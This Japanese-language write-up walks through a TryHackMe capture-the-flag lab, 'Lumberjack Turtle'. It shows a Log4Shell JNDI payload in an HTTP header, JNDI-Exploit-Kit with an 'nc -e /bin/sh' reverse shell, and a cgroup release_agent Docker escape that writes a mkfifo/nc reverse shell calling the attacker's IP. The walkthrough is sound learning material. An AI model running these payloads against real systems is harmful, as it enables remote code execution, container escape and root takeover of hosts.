# Lumberjack Turtle CTF

https://tryhackme.com/room/lumberjackturtle

## Enumeration

```shell
TARGET=10.201.93.140
sudo bash -c "echo $TARGET   lumberjack.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 60
```

```sh
root@ip-10-201-85-50:~# sudo nmap -sV -p22,80 --script vuln $TARGET
sudo: unable to resolve host ip-10-201-85-50: Name or service not known
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-15 00:55 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for lumberjack.thm (10.201.93.140)
Host is up (0.00033s latency).

PORT   STATE SERVICE     VERSION
22/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|     	PACKETSTORM:173661	9.8	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*
|     	F0979183-AE88-53B4-86CF-3AF0523F3807	9.8	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLOIT*
|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	*EXPLOIT*
|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	*EXPLOIT*
|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLOIT*
|     	2227729D-6700-5C8F-8930-1EEAFD4B9FF0	9.8	https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0	*EXPLOIT*
|     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	*EXPLOIT*
|     	BA3887BD-F579-53B1-A4A4-FF49E953E1C0	8.1	https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0	*EXPLOIT*
|     	4FB01B00-F993-5CAF-BD57-D7E290D10C1F	8.1	https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F	*EXPLOIT*
|     	CVE-2020-15778	7.8	https://vulners.com/cve/CVE-2020-15778
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	7.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
|     	2E719186-2FED-58A8-A150-762EFBAAA523	7.8	https://vulners.com/gitee/2E719186-2FED-58A8-A150-762EFBAAA523	*EXPLOIT*
|     	23CC97BE-7C95-513B-9E73-298C48D74432	7.8	https://vulners.com/githubexploit/23CC97BE-7C95-513B-9E73-298C48D74432	*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	7.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2020-12062	7.5	https://vulners.com/cve/CVE-2020-12062
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	CVE-2021-28041	7.1	https://vulners.com/cve/CVE-2021-28041
|     	CVE-2021-41617	7.0	https://vulners.com/cve/CVE-2021-41617
|     	284B94FC-FD5D-5C47-90EA-47900DAD1D1E	7.0	https://vulners.com/githubexploit/284B94FC-FD5D-5C47-90EA-47900DAD1D1E	*EXPLOIT*
|     	PACKETSTORM:189283	6.8	https://vulners.com/packetstorm/PACKETSTORM:189283	*EXPLOIT*
|     	CVE-2025-26465	6.8	https://vulners.com/cve/CVE-2025-26465
|     	9D8432B9-49EC-5F45-BB96-329B1F2B2254	6.8	https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254	*EXPLOIT*
|     	85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	6.8	https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	*EXPLOIT*
|     	1337DAY-ID-39918	6.8	https://vulners.com/zdt/1337DAY-ID-39918	*EXPLOIT*
|     	D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	6.5	https://vulners.com/githubexploit/D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	*EXPLOIT*
|     	CVE-2023-51385	6.5	https://vulners.com/cve/CVE-2023-51385
|     	C07ADB46-24B8-57B7-B375-9C761F4750A2	6.5	https://vulners.com/githubexploit/C07ADB46-24B8-57B7-B375-9C761F4750A2	*EXPLOIT*
|     	A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	6.5	https://vulners.com/githubexploit/A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	*EXPLOIT*
|     	65B15AA1-2A8D-53C1-9499-69EBA3619F1C	6.5	https://vulners.com/githubexploit/65B15AA1-2A8D-53C1-9499-69EBA3619F1C	*EXPLOIT*
|     	5325A9D6-132B-590C-BDEF-0CB105252732	6.5	https://vulners.com/gitee/5325A9D6-132B-590C-BDEF-0CB105252732	*EXPLOIT*
|     	530326CF-6AB3-5643-AA16-73DC8CB44742	6.5	https://vulners.com/githubexploit/530326CF-6AB3-5643-AA16-73DC8CB44742	*EXPLOIT*
|     	CVE-2023-48795	5.9	https://vulners.com/cve/CVE-2023-48795
|     	CVE-2020-14145	5.9	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-20012	5.3	https://vulners.com/cve/CVE-2016-20012
|     	CVE-2025-32728	4.3	https://vulners.com/cve/CVE-2025-32728
|     	CVE-2021-36368	3.7	https://vulners.com/cve/CVE-2021-36368
|_    	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
80/tcp open  nagios-nsca Nagios NSCA
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 16:FF:DB:18:76:EF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ディレクトリ列挙

~logsディレクトリ発見

```sh
dirb http://$TARGET

---- Scanning URL: http://10.201.93.140/ ----
+ http://10.201.93.140/~logs (CODE:200|SIZE:29)                                                                  
+ http://10.201.93.140/error (CODE:500|SIZE:73) 
```

```sh
$ curl -v http://lumberjack.thm/~logs                                                                                       
* Host lumberjack.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.201.93.140
*   Trying 10.201.93.140:80...
* Connected to lumberjack.thm (10.201.93.140) port 80
* using HTTP/1.x
> GET /~logs HTTP/1.1
> Host: lumberjack.thm
> User-Agent: curl/8.13.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 
< Content-Type: text/plain;charset=UTF-8
< Content-Length: 29
< Date: Mon, 15 Sep 2025 00:15:35 GMT
< 
* Connection #0 to host lumberjack.thm left intact
No logs, no crime. Go deeper.
```

log4jディレクトリ発見

```sh
gobuster dir -q -x=log,txt,java -u http://lumberjack.thm/~logs             -w ./dirlist.txt -t 64 -k

/log4j                (Status: 200) [Size: 47]
```

```sh
$ curl -v http://lumberjack.thm/~logs/log4j
* Host lumberjack.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.201.93.140
*   Trying 10.201.93.140:80...
* Connected to lumberjack.thm (10.201.93.140) port 80
* using HTTP/1.x
> GET /~logs/log4j HTTP/1.1
> Host: lumberjack.thm
> User-Agent: curl/8.13.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 
< X-THM-HINT: CVE-2021-44228 against X-Api-Version
< Content-Type: text/plain;charset=UTF-8
< Content-Length: 47
< Date: Mon, 15 Sep 2025 00:24:44 GMT
< 
* Connection #0 to host lumberjack.thm left intact
Hello, vulnerable world! What could we do HERE?
```

このディレクトリで何かをやるということ。何を？

何も出ない。txt,javaも同様。

```sh
$ ffuf -u http://lumberjack.thm/~logs/log4j/FUZZ.log -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
```

## CVE-2021-44228 (Log4Shell)

不正なAcceptヘッダーを送る。

```http
GET /~logs/log4j HTTP/1.1
Host: lumberjack.thm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept: ${jndi:ldap://10.11.146.32:6666}
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
x-forwarded-for: 10.10.10.1
Connection: keep-alive
```

接続が返ってきたので、Log4Shellの脆弱性があると判断できる。

```sh
$ nc -nlvp 6666   
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.93.140] 46080
0
 `�^C
```

エクスプロイト

```sh
git clone https://github.com/pimps/JNDI-Exploit-Kit
cd JNDI-Exploit-Kit
java -jar JNDI-Exploit-Kit.jar -C "nc 10.11.146.32 8888 -e /bin/sh" -A "10.11.146.32"
```

```sh
$ curl http://lumberjack.thm -H 'Accept: ${jndi:ldap://10.11.146.32:1389/5wvdvn}'
```

リバースシェル取得成功

```sh
$ nc -lnvp 8888   
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.48.107] 42577
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

flag1発見。

```sh
./opt:
total 12
drwxr-xr-x    1 root     root          4096 Dec 11  2021 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
-rw-r--r--    1 root     root            19 Dec 11  2021 .flag1
```

## Dockerエスケープ

cgroup は v1

```sh
mount | grep cgroup
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755,inode64)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/misc type cgroup (rw,nosuid,nodev,noexec,relatime,misc)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
```

エクスプロイト

```sh
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.146.32 7777 >/tmp/f" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

ホストシェル取得成功

```sh
$ nc -lnvp 7777             
listening on [any] 7777 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.48.107] 50010
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -al /root
total 36
drwx------  5 root root 4096 Jun  5 18:16 .
drwxr-xr-x 22 root root 4096 Sep 16 06:37 ..
drwxr-xr-x  2 root root 4096 Dec 13  2021 ...
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 24 14:35 .cache
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Dec 13  2021 .ssh
-rw-------  1 root root  966 Jun  5 18:16 .viminfo
-r--------  1 root root   29 Dec 13  2021 root.txt
```

flag2発見

```sh
# find / -iname *flag2*; echo hello
/root/.../._fLaG2
```

## 振り返り

- log4shell をCTFで悪用するのはたぶん初めてで、良い経験になった。
